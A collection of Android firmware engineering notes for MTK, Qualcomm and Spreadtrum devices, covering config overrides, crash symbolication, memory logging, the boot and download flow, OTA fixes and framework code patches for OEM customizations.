    ... ...
}
```

## [默认值]  [FAQ22977]  Android Q 如何修改MMS UA、mms UA Profile

```text
App会通过下面的api来获取UserAgent： 
String userAgent = telephonyManager.getMmsUserAgent(); 
//最后会调到 /packages/services/Telephony/src/com/android/phone/PhoneInterfaceManager.java里面获取config_mms_user_agent的值
/packages/services/Telephony/src/com/android/phone/PhoneInterfaceManager.java 

7082      @Override
7083      public String getMmsUserAgent(int subId) {
7084          //TODO investigate if this API should require proper permission check in R b/133791609
7085          final long identity = Binder.clearCallingIdentity();
7086          try {
7087              return SubscriptionManager.getResourcesForSubId(getDefaultPhone().getContext(), subId)
7088                      .getString(com.android.internal.R.string.config_mms_user_agent);
7089          } finally {
7090              Binder.restoreCallingIdentity(identity);
7091          }
7092      }

可以参考修改下面的两个路径下面的xml文件：
/device/mediatek/system/common/overlay/telephony/frameworks/base/core/res/res/values/config.xml

<!-- MMS user agent string -->
54     <string name="config_mms_user_agent" translatable="false">Android-Mms/0.1</string>
55
56     <!-- MMS user agent prolfile url -->
57     <string name="config_mms_user_agent_profile_url" translatable="false">http://www.google.com/oha/rdf/ua-profile-kila.xml</string>

/device/mediatek/common/overlay/telephony/frameworks/base/core/res/res/values/config.xml

<!-- MMS user agent string -->
54     <string name="config_mms_user_agent" translatable="false">Android-Mms/0.1</string>
55
56     <!-- MMS user agent prolfile url -->
57     <string name="config_mms_user_agent_profile_url" translatable="false">http://www.google.com/oha/rdf/ua-profile-kila.xml</string>
58
PS： 适用于Android Q版本 google  messaging app
```

## [CB]  [FAQ22310]  阿联酋政府TRA紧急小区广播认证SOP

```text
TRA是阿联酋政府电信监管局的简称，其对手机紧急小区功能提出了一套认证需求。MTK official Release的code package中包含CMASReceiver这个APK用于实现接收紧急小区广播功能。CMASReceiver APK的source code的路径为/vendor/mediatek/proprietary/packages/apps/CMASReceiver/，下文中该路径记为CMASReceiverBase。关于CmasReceiver和小区广播的相关基本信息，请参考FAQ17750。
```

## [FAQ22661]  [Encryption]  How to check system encryption type

```text
Encryption is the process of encoding all user data on an Android device using symmetric encryption keys. Once a device is encrypted, all user-created data is automatically encrypted before committing it to disk and all reads automatically decrypt data before returning it to the calling process. Encryption ensures that even if an unauthorized party tries to access the data, they won’t be able to read it.

Reference for more detail: https://source.android.com/security/encryption

Encryption type
Full-disk encryption (FDE)
File-based encryption (FBE)

How to check encryption type
ADB command: # getprop | grep crypt

k62v1_64_bsp:/ # getprop | grep crypt
[ro.crypto.state] : [encrypted] 
[ro.crypto.type] : [file] 
[ro.crypto.volume.filenames_mode] : [aes-256-cts] 

Result -
[ro.crypto.state] : [encrypted]  -> encrypted
[ro.crypto.type] : [file]  -> FBE
[ro.crypto.type] : [block]  -> FDE
```

## [CMD]  [工具] addr2line

```text
一般碰到NE的异常需要通过addr2line把异常地址转成code文件和行号。
比如以下crash信息：
12-21 10:51:56.282095 13353 13353 F DEBUG   : pid: 13319, tid: 13350, name: fonts  >>> com.google.android.dialer <<<
12-21 10:51:56.282125 13353 13353 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0
12-21 10:51:56.282153 13353 13353 F DEBUG   : Cause: null pointer dereference
12-21 10:51:56.282272 13353 13353 F DEBUG   :     r0  a8fa6800  r1  00000000  r2  a8fa6c40  r3  00000000
12-21 10:51:56.282338 13353 13353 F DEBUG   :     r4  00000000  r5  ffffffff  r6  9868cb54  r7  9868ebc0
12-21 10:51:56.282385 13353 13353 F DEBUG   :     r8  ffffffff  r9  9868cb50  r10 00000001  r11 00000087
12-21 10:51:56.282450 13353 13353 F DEBUG   :     ip  a8fa6c40  sp  9868cb48  lr  b4a310e5  pc  b25dd0c4
12-21 10:51:56.522614 13353 13353 F DEBUG   : 
12-21 10:51:56.522614 13353 13353 F DEBUG   : backtrace:
12-21 10:51:56.522743 13353 13353 F DEBUG   :     #00 pc 000df0c4  /system/lib/libandroid_runtime.so (Typeface_createFromArray(_JNIEnv*, _jobject*, _jlongArray*, int, int)+172)
12-21 10:51:56.522825 13353 13353 F DEBUG   :     #01 pc 0038f371  /system/framework/arm/boot-framework.oat (offset 0x38c000) (android.content.res.StringBlock.nativeCreate [DEDUPED] +128)
12-21 10:51:56.522869 13353 13353 F DEBUG   :     #02 pc 006e56c3  /system/framework/arm/boot-framework.oat (offset 0x38c000) (android.graphics.Typeface.createFromFamiliesWithDefault+434)
12-21 10:51:56.522910 13353 13353 F DEBUG   :     #03 pc 006e41ad  /system/framework/arm/boot-framework.oat (offset 0x38c000) (android.graphics.Typeface$Builder.build+2860)
12-21 10:51:56.522946 13353 13353 F DEBUG   :     #04 pc 0040d775  /system/lib/libart.so (art_quick_invoke_stub_internal+68)
#00 pc 000df0c4  /system/lib/libandroid_runtime.so (Typeface_createFromArray(_JNIEnv*, _jobject*, _jlongArray*, int, int)+172)
 
本地有libandroid_runtime.so即通过以下命令     跟上路径(请使用symbols下的so)和报错地址
addr2line -Cfe '/media/E/MP_P1/alps-release-p0.mp1-default/alps/out/target/product/k39tv1_bsp/symbols/system/lib/libandroid_runtime.so' 000df0c4
得到以下输出：
__vector_base
external/libcxx/include/vector:421
分别是方法名和文件及行号，即可找到位置
可选参数如下，一般使用 -fe即可
  -a --addresses         Show addresses
  -b --target=<bfdname>  Set the binary file format
  -e --exe=<executable>  Set the input file name (default is a.out)
  -i --inlines           Unwind inlined functions
  -j --section=<name>    Read section-relative offsets instead of addresses
  -p --pretty-print      Make the output easier to read for humans
  -s --basenames         Strip directory names
  -f --functions         Show function names
  -C --demangle[=style]   Demangle function names
  -h --help              Display this information
  -v --version           Display the program's version
```

## 屏幕常亮

```text
对于有些界面需要常亮的时候：
网上普遍的方法都是推荐使用PowerManager.WakeLock类实现。但是实际中并没有什么作用。
当设置参数很多参数都已经过时。在高版本中根本没有效果。
无意中发现网上提到了View.keepScreenOn和android:keepScreenOn属性，这两个属性很给力。
前者可以动态的在Activity中设置页面常量。后者是在XML布局中设置。
keepScreenOn使用方法很简单
step 1:在你需要常亮的Activity对应的布局文件中,随便给一个UI组件设置:android:keepScreenOn="true"
           然后,只要Activity不被停止的话,那么屏幕会一直保持常亮哦!
step 2:怎么关闭常亮么?也很简单啊~在你需要关闭常亮的时候,修改UI组件的属性,把他设置为false就可以了
```

## MTK:刷机后每次都要fastboot unlock设备

```text
vendor/mediatek/proprietary/bootable/bootloader/lk/project/am01_wq.mk
-MTK_SEC_FASTBOOT_UNLOCK_SUPPORT = yes
+MTK_SEC_FASTBOOT_UNLOCK_SUPPORT = no

只debug版本关闭
am01_wq/vendor/mediatek / proprietary/bootable/bootloader/lk/Android.mk

ifneq ($(TARGET_BUILD_VARIANT),userdebug)
    LK_FES_MAKE_OPTION += MTK_SEC_FASTBOOT_UNLOCK_SUPPORT = no
endif
.KATI_RESTAT: $(BUILT_LK_FES_TARGET)
$(BUILT_LK_FES_TARGET): FORCE
 $(hide) mkdir -p $(dir $@)
 $(MAKE) -C $(LK_DIR) $(LK_FES_MAKE_OPTION) $(LK_PROJECT)

am01_wq/vendor/mediatek / proprietary/bootable/bootloader/preloader/Android.mk

ifneq (,$(PL_MODE))
  PRELOADER_OUT := $(if $(filter /% ~%,$(TARGET_OUT_INTERMEDIATES)),,$(PRELOADER_ROOT_DIR)/)$(TARGET_OUT_INTERMEDIATES)/PRELOADER_$(PL_MODE)_OBJ
  BUILT_PRELOADER_TARGET := $(PRELOADER_OUT)/bin/preloader_$(PRELOADER_TARGET_PRODUCT)_$(PL_MODE).bin
else
  PRELOADER_OUT := $(if $(filter /% ~%,$(TARGET_OUT_INTERMEDIATES)),,$(PRELOADER_ROOT_DIR)/)$(TARGET_OUT_INTERMEDIATES)/PRELOADER_OBJ
  BUILT_PRELOADER_TARGET := $(PRELOADER_OUT)/bin/preloader_$(PRELOADER_TARGET_PRODUCT).bin
endif

PRELOADER_MAKE_OPTION := $(if $(SHOW_COMMANDS),,-s) -f Makefile $(if $(PRELOADER_CROSS_COMPILE),CROSS_COMPILE=$(PRELOADER_CROSS_COMPILE)) PRELOADER_OUT=$(PRELOADER_OUT) MTK_PROJECT=$(PRELOADER_TARGET_PRODUCT) TOOL_PATH=$(PRELOADER_ROOT_DIR)/device/mediatek/build/build/tools ROOTDIR=$(PRELOADER_ROOT_DIR) PL_MODE=$(PL_MODE)

ifeq ($(TARGET_BUILD_VARIANT),userdebug)
PRELOADER_MAKE_OPTION += MTK_SEC_BOOT=ATTR_SBOOT_DISABLE
.KATI_RESTAT: $(BUILT_PRELOADER_TARGET)
$(BUILT_PRELOADER_TARGET): PRIVATE_PRELOADER_MAKE_OPTION := $(PRELOADER_MAKE_OPTION)
$(BUILT_PRELOADER_TARGET): FORCE
 $(hide) mkdir -p $(dir $@)
 $(MAKE) -C $(PRELOADER_DIR) $(PRIVATE_PRELOADER_MAKE_OPTION)
endif

endif#PRELOADER_TARGET_PRODUCT
```

## [log] mlog

```text
mlog 为内存debug机制，会不停的记录系统内存使用情况，可以用来查看系统运行过程各类型各进程内存变化等
JE , swt , NE , 等exception db 解开后可以从 SYS_MEMORY_LOG得到mlog讯息
（SYS_MEMORY_LOG   是从  /d/dmlog  抓取而来） 
 
由于/d/dmlog 为ring buffer ， 有固定的buffer size , 
发生exception 后打包db时间如果间隔过久有可能把前面mlog讯息冲掉而获取不到问题时间点的mlog讯息
此时可以加大mlog buffer size 
修改方式如下
/kernel-xx/drivers/misc/mediatek/mlog/mlog_logger.c
#define CONFIG_MLOG_BUF_SHIFT   16  /* 64KB for 32bit, 128kB for 64bit */
修改成
#define CONFIG_MLOG_BUF_SHIFT   17
即为buffer size    128KB -> 256KB  for 64bit   ， 也可以更大， 不过由于会占用固定系统内存， 建议适量修改

修改后adb pull /d/dmlog 可以明显看到文件变大

抓取mlog的几种方法
adb shell cat /sys/kernel/debug/mlog > mlog
adb shell cat /d/mlog        (持续每秒记录mlog讯息)
adb shell cat /d/dmlog       (一次性打印 mlog buffer 所有讯息)

使用 adb shell cat /sys/kernel/debug/mlog 的方式查看内存的Log，可以查看当时状态的整体状况，同时包含当前程序内存使用情况
该信息是每1秒钟打印1条，从而可以看到连续的内存状况。

/sys/module/mlog/parameters/timer_intval
mlog记录默认为每秒更新，通过修改此参数可以减小(或加大)记录时间间隔

swfree  空间逐渐变为0 , 代表那个时间需要大量的使用内存，同时这个时间点数据压到内存比较积极

FAQ21497 mlog 信息查看及其初步的分析
FAQ21888 mlog 信息抓取时间间隔以及其它有用的调整参数
FAQ21889 mlog (SYS_MEMORY_LOG) 的 buffer size 如何修改
```

## [sprd] 展锐下载过程

```text
首先，我们要了解这样一个背景知识：展讯的每颗智能芯片（其他智能机平台应该也是如此)内部都有IROM和IRAM，IROM里有固化的Romcode（用于与PC端工具通讯，下载程序）。

由于芯片内部固化的IRAM价格昂贵，容量十分有限，在不同平台上通常只有十几KB到几十KB大小，这么小的内存，是无法支持动辄几百MB的BIN下载的。因此，展讯下载BIN就划分为两级（FDL1和FDL2）下载，利用外部DDR空间大（通常在数十MB到数百MB范围内）的特点，将绝大部分下载代码放到第二级来进行。

展讯智能机的FDL1，SPL文件由代码中的chipram文件夹生成，FDL2，UBOOT文件则由u-boot文件夹生成。

好了，背景了解完毕，下面我们来简单阐述展讯平台的下载和开机流程：

系统上电开机，IROM中的Romcode开始运行，检查系统download键是否按下，若是，则进入下载流程，否则进入开机流程：

一.   下载过程
1.      Romcode（0x00000000）：与PC通信，下载FDL1到IRAM。FDL1只包含DDR驱动及配置，只需要几KB的运行空间，可以被ROMCODE与下载工具通讯将之下载到IRAM中运行。
2.      FDL1：FDL1被下载到IRAM后，PC指针跳到IRAM的起始地址开始运行FDL1。FDL1首先初始化外部DDRRAM，配置外部DDR的寄存器和时序，然后再与下载工具通讯将FDL2下载到外部DDR中运行。
3.      FDL2：FDL2被下载到DDR中之后，有充足的运行空间，FDL2带NAND/EMMCflash驱动程序，可以初始化FLASH，并把PAC包的其他各个模块都写入到FLASH中。

二. 开机过程

1.  Romcode：0x00000000：判断是开机，复制spl到IRAM，并运行spl（包含DDR驱动及配置）
2. SPL：初始化外部DDRRAM，配置外部DDR的寄存器和时序，然后再拷贝uboot到外部DDR中运行
3. UBOOT：带带NAND/EMMCflash驱动程序，带部分设备初始化，复制其他image到DDRRAM，判断开机模式并进入相应模式。

好了，了解完下载流程，下面，我们将对软件下载过程中遇到的涉及FDL1，FDL2文件的一些问题进行简单分析:
1. 下载工具上FDL1进度条没有走：
（1）.软件问题，请首先请检查pc端下载驱动是否安装正确；
（2）.操作问题：请首先确认下载操作步骤是否正确，是否已经上电；其次还要确认电脑端口是否有问题，下载数据线是否OK。
（3）.硬件问题：如果你已经在这台电脑上下载过展讯平台的软件，那基本可以确认是硬件的问题了：可能是板子CPU没跑起来；也有可能是板子通讯端口有问题。总之，你把机器丢给硬件的哥们就对了。

2.FDL2的进度条没有走：
（1）.硬件问题：DDR存储芯片焊接问题，导致完全不通讯---这个可能性比较大。
（2）.软件问题：FDL1中的DDR芯片驱动程序问题。请确认DDR芯片类型，容量大小，cs等设置。

3.FDL2的进度条没有走完或走完后不动了：
（1）.硬件问题：DDR存储芯片焊接问题，尤其是虚焊问题。
（2）.软件问题：FDL1中的DDR芯片驱动程序问题，包括DDR时序及容量大小bank配置等等----这个可能性比较大。

额外再插一句，如何调试FDL?FDL中已经有许多UARTlog，因此通过串口log调试最轻松。可以用USB下载，另外再用uart线连手机的uart口。

4. 下载system.img进度条没有走完：

软件问题：
（1）.uboot中的DDR芯片驱动程序问题，包括DDR时序及容量大小bank配置等等。
（2）.uboot中的NAND/EMMCflash存储芯片驱动程序问题
（3）.boardconfig.mk中系统模块分区大小问题.
```

## 灭屏后瞬间按返回键，可以点亮屏幕

```text
frameworks/base/core/java/android/view/KeyEvent.java
/** @hide */                              
public static final boolean isWakeKey(int keyCode) {  
    switch (keyCode) {                          
        case KeyEvent.KEYCODE_BACK: //删除      
        case KeyEvent.KEYCODE_MENU:              
        case KeyEvent.KEYCODE_PAIRING:                        
        case KeyEvent.KEYCODE_STEM_2:                              
        case KeyEvent.KEYCODE_STEM_3:                          
            return true;                                        
    }                                                          
    return false;                                          
}
```

## [bug] android 底座充电压力插拔，有概率没有提示音

```text
--- a/frameworks/base/services/core/java/com/android/server/power/WirelessChargerDetector.java
+++ b/frameworks/base/services/core/java/com/android/server/power/WirelessChargerDetector.java
@@ -76,7 +76,10 @@ final class WirelessChargerDetector {
 
     // The minimum amount of time to spend watching the sensor before making
     // a determination of whether movement occurred.
-    private static final long SETTLE_TIME_MILLIS = 800;
+    /*meig:jicong.wang modify for bug 10001 & 9982 start {@*/
+    //private static final long SETTLE_TIME_MILLIS = 800;
+    private static final long SETTLE_TIME_MILLIS = 200;
+    /*meig:jicong.wang modify for bug 10001 & 9982 end @}*/
 
     // The sensor sampling interval.
     private static final int SAMPLING_INTERVAL_MILLIS = 50;

```

## android如何禁止安装第三方应用

```text
PackageManagerService.java
private void installPackageLI(InstallArgs args, PackageInstalledInfo res) {
    final int installFlags = args.installFlags;
    final String installerPackageName = args.installerPackageName;
    final String volumeUuid = args.volumeUuid;
    final File tmpPackageFile = new File(args.getCodePath());
    final boolean forwardLocked = ((installFlags & PackageManager.INSTALL_FORWARD_LOCK) != 0);
    final boolean onExternal = (((installFlags & PackageManager.INSTALL_EXTERNAL) != 0)
            || (args.volumeUuid != null));
    final boolean instantApp = ((installFlags & PackageManager.INSTALL_INSTANT_APP) != 0);
    final boolean fullApp = ((installFlags & PackageManager.INSTALL_FULL_APP) != 0);
    final boolean forceSdk = ((installFlags & PackageManager.INSTALL_FORCE_SDK) != 0);
    final boolean virtualPreload =
            ((installFlags & PackageManager.INSTALL_VIRTUAL_PRELOAD) != 0);
    boolean replace = false;
    @ScanFlags int scanFlags = SCAN_NEW_INSTALL | SCAN_UPDATE_SIGNATURE;
    /*meig:jicong.wang add for task 4616 start {@*/
    if (mSystemReady) {
        if (!SystemProperties.getBoolean("persist.sys.installed", false)) {
            res.setReturnCode(PackageManager.INSTALL_FAILED_INVALID_APK);
            return;
        }
    }
    /*meig:jicong.wang add for task 4616 end @}*/
```

## [prop] Android P on property属性无法trigger

```text
修改将属性加入白名单 system/xxx/stable_properties.h
static const std::set<std::string> kExportedActionableProperties = {
    "dev.bootcomplete",
    "init.svc.console",
    "init.svc.mediadrm",
    "init.svc.surfaceflinger",
    "init.svc.zygote",
    "persist.bluetooth.btsnoopenable",
    "persist.sys.crash_rcu",
    "persist.sys.usb.usbradio.config",
    "persist.sys.zram_enabled",
    "ro.board.platform",
    "ro.bootmode",
    "ro.build.type",
    "ro.crypto.state",
    "ro.crypto.type",
    "ro.debuggable",
    "sys.boot_completed",
    "sys.boot_from_charger_mode",
    "sys.retaildemo.enabled",
    "sys.shutdown.requested",
    "sys.usb.config",
    "sys.usb.configfs",
    "sys.usb.ffs.mtp.ready",
    "sys.usb.ffs.ready",
    "sys.user.0.ce_available",
    "sys.vdso",
    "vold.decrypt",
    "vold.post_fs_data_done",
    "vts.native_server.on",
    "wlan.driver.status",
};
```

## [recovery] recovery command 升级

```text
mkdir -p /cache/recovery
echo "-update_package=/data/ota1" >> /cache/recovery/command
chmod 777 /cache/recovery/command
sync
reboot recovery
```

## [默认值] android 去掉视频通话功能及菜单

```text
frameworks/base/core/res/res/values/config.xm
<bool name="config_device_vt_available">false</bool>
```

## [ota] android ota升级报sha1错误的问题

```text
高通平台，ota升级过程中会报sha1值错误
主要是make otapackage 之后，makefile 没有将obj/PACKAGEING/target_files_intermediates 下面的img文件替换 PRODUCT_OUT 下面的img文件。
修改如下：
在build 下的makefile 添加如下：
$(hide) cp -f $(PRODUCT_OUT)/obj/PACKAGING/target_files_intermediates/$(TARGET_DEVICE)-target_files-$(FILE_NAME_TAG)/IMAGES/boot.img $(PRODUCT_OUT)
$(hide) cp -f $(PRODUCT_OUT)/obj/PACKAGING/target_files_intermediates/$(TARGET_DEVICE)-target_files-$(FILE_NAME_TAG)/IMAGES/system.img $(PRODUCT_OUT)
$(hide) cp -f $(PRODUCT_OUT)/obj/PACKAGING/target_files_intermediates/$(TARGET_DEVICE)-target_files-$(FILE_NAME_TAG)/IMAGES/vendor.img $(PRODUCT_OUT)
注：
通过adb 查看sha1值
sha1sum file
```

## android recovery two-step 升级错误

```text
分析updater-script 发现：

# Stage 1/3
set_stage("/dev/block/bootdevice/by-name/misc", "2/3");
reboot_now("/dev/block/bootdevice/by-name/misc", "");
stage 1/3 完成之后，reboot 没有设置设置进入recovery模式。
reboot_now("/dev/block/bootdevice/by-name/misc", "recovery");
```

## android otg连接外部音响调节音量后，重启后音量不是之前设置的音量

```text
问题描述
android otg连接外部音响调节音量后，重启后音量不是之前设置的音量

问题分析
通过分析AudioService.java之后我们发现在每次手机重启时，AudioService start 时都会去获取

mSafeUsbMediaVolumeIndex = getSafeUsbMediaVolumeIndex();
通过上面发现，当我们设置的音量大于保护音量时，重启手机，会自动将音量设置为保护音量之下。

修改：
// mSafeMediaVolumeDevices lists the devices for which safe media volume is enforced,
private final int mSafeMediaVolumeDevices = AudioSystem.DEVICE_OUT_WIRED_HEADSET |
                                            AudioSystem.DEVICE_OUT_WIRED_HEADPHONE |
                                            AudioSystem.DEVICE_OUT_USB_HEADSET;

// mSafeMediaVolumeDevices lists the devices for which safe media volume is enforced,
private final int mSafeMediaVolumeDevices = AudioSystem.DEVICE_OUT_WIRED_HEADSET |
                                                AudioSystem.DEVICE_OUT_WIRED_HEADPHONE；
```

## [知识点] 获取运营商名称的流程

```text
当用户去Query当前的网络运营商的时候, MD会报上来一些网络运营商，结果如下:
12-09 14:31:10.313479 1191 1228 I AT : [0]  AT< +COPS:
(1,“BGD BL”,“BGDBL”,“47003”,“03F2”,7),
(1,“robi axiata”,“robi”,“47002”,“1393”,7),
(1,“47001”,“47001”,“47001”,“2743”,7),
(1,“BGD BL”,“BGDBL”,“47003”,“02EE”,2),…,(0-3),(0-2) (RIL_CMD_READER_1, tid:496938079472)
问题1: 经常有客户会问，比如47001这个运营商对应的运营商名称是什么?
回答: 可参考MtkRIL.java 中的lookupOperatorName这个Function.
基本上这个函数会分4步去Query当前的结果:
Step1: 首先从SIM卡中的(OPL/PNN)去读取相关的Operator Name.
Step2: 如果Step1没有获取到, 那么就从SIM卡中的CPHS去获取相关的OperatorName.
Step3: 如果Step2没有获取到, 那么接下来就会去NITZ相关的property中获取OperatorName, 相关MD上报的URC是：+CIEV:10,***
Step4: 如果Step3中没有获取到, 那么接下来就要从Device存储的File当中去获取, 如spn_config.xml

问题2: 这个时候，也有客户会问, 这个逻辑是不是Mtk内部的?
回答: 遵从了3GPP的Spec规定, 3GPP的规定如下:
Spec的出处是22.101 A.3/A.4.
Spec的内容如下：
1,It shall be possible to store on the USIM at least 10 PLMN Identifications (MCC+MNC combination and optionally the LAI) for which the same PLMN name shall be displayed.
2,The PLMN name stored in the USIM has the highest priority, followed by the PLMN name provided by NITZ. The PLMN name stored in the ME has the lowest priority.
3,If the PLMN name stored in the USIM is not available in text format and the UE is unable to display the graphic format, thePLMN name provided by NITZ has the highest priority,
4,the PLMN name stored in the ME has the next priority.
```

## android mtk p修改关机测试，快速进入版本信息后，modem imei barcode 为unknown的问题

```text
static int create_md_verinfo(char *info, int *len) {
    char ccci_path[MAX_MODEM_INDEX]  [32] ;
    memset(ccci_path, 0, sizeof(char) * MAX_MODEM_INDEX * 32);
    char temp_ccci_path [MAX_MODEM_INDEX]  [32] ;
    memset(temp_ccci_path, 0, sizeof(char) * MAX_MODEM_INDEX * 32);  
    char imei[4]  [128] ;
    memset(imei, 0, sizeof(char) * 4 * 128);
    char meid[128] ;
    memset(meid, 0, sizeof(char) * 128);
    char md_ver[2]  [128] ;
    memset(md_ver, 0, sizeof(char) * 2 * 128);
    char barcode[2]  [128] ;
    memset(barcode, 0, sizeof(char) * 2 * 128);
    Connection modem[5] ;
    int md_num = get_md_count();
    int lte_md_num = get_lte_md_count();
    int sim_num = ftm_get_sim_num();
 /*SUN:jicong.wang add start {@*/
    int num=0;
connet:
 /*SUN:jicong.wang add end @}*/
    int i = 0, j = 0;
    for(i = 0; i < MAX_MODEM_INDEX; i++)
    {
        if(1 == get_ccci_path(i,temp_ccci_path[i] ))
        {
            strncpy(ccci_path[j] ,temp_ccci_path[i] , strlen(temp_ccci_path[i] ));
            j++ ;
        }
    }
    for (int i = 0; i < md_num; i++)
    {
        if (strlen(ccci_path[i] ) > 0) {
            if(0 == modem[i] .Conn_Init(ccci_path[i] ,i,g_SIGNAL_Callback[i] )) {
                LOGD(TAG "modem %d open fail",(i));
            } else {
                LOGD(TAG "modem %d open OK",(i));
            }
        }
    }

    if (1 == isC2kSupport())
    {
        if(g_Flag_VPUP != 1)
        {
            if(ER_OK!= modem[md_num-1] .QueryModemStatus())
            {
                g_Flag_VPUP = 0;
                wait_URC(ID_VPUP);
            }
            else
            {
                g_Flag_VPUP = 1 ;
            }
        }
        LOGD("modem c2k open successfully");
        getMEID(modem[md_num-1] , meid);
    }
    for (int i = 0; i < lte_md_num; i++)
    {
        if(g_Flag_EIND != 1)
        {
            if(ER_OK!= modem[i] .QueryModemStatus())
            {
                g_Flag_EIND = 0 ;
                wait_URC(ID_EIND);
            }
            else
            {
                g_Flag_EIND = 1 ;
            }
        }
    }
    getIMEI(1, modem[0] , imei[0] );
    getModemVersion(modem[0] , md_ver[0] );
    getBarcode(modem[0] , barcode[0] );
 /*SUN:jicong.wang add start {@*/
    if(strlen(imei[0] )==0 || strlen(md_ver[0] )==0 ||  strlen(barcode[0] )==0 ){
        if(num<3){
            num++;
            LOGD(TAG "goto connect");
            goto connet;  
        } 
    }  
    /*SUN:jicong.wang add end @}*/
    ....
```

## android 修改手机联电脑，内部存储大小

``frameworks/base/media/java/android/mtp/MtpStorage.java``

```text
int64_t MtpStorage::getMaxCapacity() {
    if (mMaxCapacity == 0) {
        struct statfs   stat;
        if (statfs(getPath(), &stat))
            return -1;
        mMaxCapacity = (uint64_t)stat.f_blocks * (uint64_t)stat.f_bsize;
    }
//modified begin
    if(!mRemovable){
     if(property_get_int64("persist.sys.memory_rom", 0)==64){
      mMaxCapacity = (uint64_t)64*1024*1024*1024;
     }else if(property_get_int64("persist.sys.memory_rom", 0)==32){
      mMaxCapacity = (uint64_t)32*1024*1024*1024;
     }else if(property_get_int64("persist.sys.memory_rom", 0)==16){
      mMaxCapacity = (uint64_t)16*1024*1024*1024;
     }
    }
//modified end
    return mMaxCapacity;
}
```

## android p 去掉短信，电话，每次询问项

```text
package com.android.settings.sim;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import com.android.settings.R;

import java.util.List;

/**
 * Created by wjc on 19-5-25.
 */

public class SimCallSettingReciver extends BroadcastReceiver {
    private static final String TAG = SimCallSettingReciver.class.getName();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "action = " + intent.getAction());

        if (!context.getResources().getBoolean(R.bool.sim_call_ask_every_time_disable)) {
            return;
        }
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            if (SubscriptionManager.from(context).getActiveSubscriptionInfoCount() > 1) {
                setSim(context);
                setCall(context);
            }
        }
    }

    private void setCall(Context context) {
        try {
            TelecomManager telecomManager = TelecomManager.from(context);
            if (telecomManager.getUserSelectedOutgoingPhoneAccount() == null) {
                Log.d(TAG, "setCall");
                List<PhoneAccountHandle> phoneAccountsList = telecomManager.getCallCapablePhoneAccounts();
                telecomManager.setUserSelectedOutgoingPhoneAccount(phoneAccountsList.get(0));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setSim(Context context) {
        try {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
            if (subscriptionManager.getDefaultSmsSubscriptionInfo() == null) {
                Log.d(TAG, "setSim");
                List<SubscriptionInfo> subInfoList = subscriptionManager.getActiveSubscriptionInfoList();
                int subid = subInfoList.get(0).getSubscriptionId();
                subscriptionManager.setDefaultSmsSubId(subid);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## android设置主题背景无效

``frameworks/base/services/core/java/com/android/server/wallpaper/WallpaperManagerService.java``

```text
private static final boolean sInitColorBasedOnDefaultWp =  true;
//            SystemProperties.getBoolean("ro.defaultwp.colorextracted",
//                    !ActivityManager.isLowRamDeviceStatic());

private void extractColors(WallpaperData wallpaper) {
    String cropFile = null;
    boolean defaultImageWallpaper = false;
    int wallpaperId;

    synchronized (mLock) {
        // Not having a wallpaperComponent means it's a lock screen wallpaper.
        final boolean imageWallpaper = mImageWallpaper.equals(wallpaper.wallpaperComponent)
                || wallpaper.wallpaperComponent == null;
        if (imageWallpaper && wallpaper.cropFile != null && wallpaper.cropFile.exists()) {
            cropFile = wallpaper.cropFile.getAbsolutePath();
         } else if (imageWallpaper && !wallpaper.cropExists() && !wallpaper.sourceExists()) {
            defaultImageWallpaper = true;
        }
        wallpaperId = wallpaper.wallpaperId;
    }

    WallpaperColors colors = null;
    if (cropFile != null) {
        Bitmap bitmap = BitmapFactory.decodeFile(cropFile);
        if (bitmap != null) {
            colors = WallpaperColors.fromBitmap(bitmap);
            bitmap.recycle();
        }
    } else if (defaultImageWallpaper) {
        // There is no crop and source file because this is default image wallpaper.
        try (final InputStream is =
                     WallpaperManager.openDefaultWallpaper(mContext, FLAG_SYSTEM)) {
            if (is != null) {
                try {
                    final BitmapFactory.Options options = new BitmapFactory.Options();
                    final Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
                    if (bitmap != null) {
                        colors = WallpaperColors.fromBitmap(bitmap);
                        bitmap.recycle();
                    }
                } catch (OutOfMemoryError e) {
                    Slog.w(TAG, "Can't decode default wallpaper stream", e);
                }
            }
        } catch (IOException e) {
            Slog.w(TAG, "Can't close default wallpaper stream", e);
        }
    }

    if (colors == null) {
        Slog.w(TAG, "Cannot extract colors because wallpaper could not be read.");
        return;
    }

    synchronized (mLock) {
        if (wallpaper.wallpaperId == wallpaperId) {
            wallpaper.primaryColors = colors;
            // Now that we have the colors, let's save them into the xml
            // to avoid having to run this again.
            saveSettingsLocked(wallpaper.userId);
        } else {
            Slog.w(TAG, "Not setting primary colors since wallpaper changed");
        }
    }
}
```

## android P虚拟按键点击位置加大的问题

```text
public class NearestTouchFrame extends FrameLayout {

    private final ArrayList<View> mClickableChildren = new ArrayList<>();
    private final boolean mIsActive;
    private final int[]  mTmpInt = new int[2] ;
    private final int[]  mOffset = new int[2] ;
    private View mTouchingChild;

    public NearestTouchFrame(Context context, AttributeSet attrs) {
        this(context, attrs, context.getResources().getConfiguration());
    }

    @VisibleForTesting
    NearestTouchFrame(Context context, AttributeSet attrs, Configuration c) {
        super(context, attrs);
        mIsActive = c.smallestScreenWidthDp < 600;//这个地方做修改。可以去掉或者改变大小
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        if (mIsActive) {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                mTouchingChild = findNearestChild(event);
            }
            if (mTouchingChild != null) {
                event.offsetLocation(mTouchingChild.getWidth() / 2 - event.getX(),
                        mTouchingChild.getHeight() / 2 - event.getY());
                return mTouchingChild.getVisibility() == VISIBLE
                        && mTouchingChild.dispatchTouchEvent(event);
            }
        }
        return super.onTouchEvent(event);
    }
```

## [sprd] APN显示虚拟运营商名称(sprd5.0)

```text
虚拟运营商和实体运营商的区分方式有哪几种?
MVNO和对应MNO的MCC/MNC是相同的，那就需要MVNO定义额外的标识来和对应MNO做区分。
通常，根据SIM卡中的特殊数据信息，比如spn/pnn/gid/imsi等特殊字段自定义标识区分.

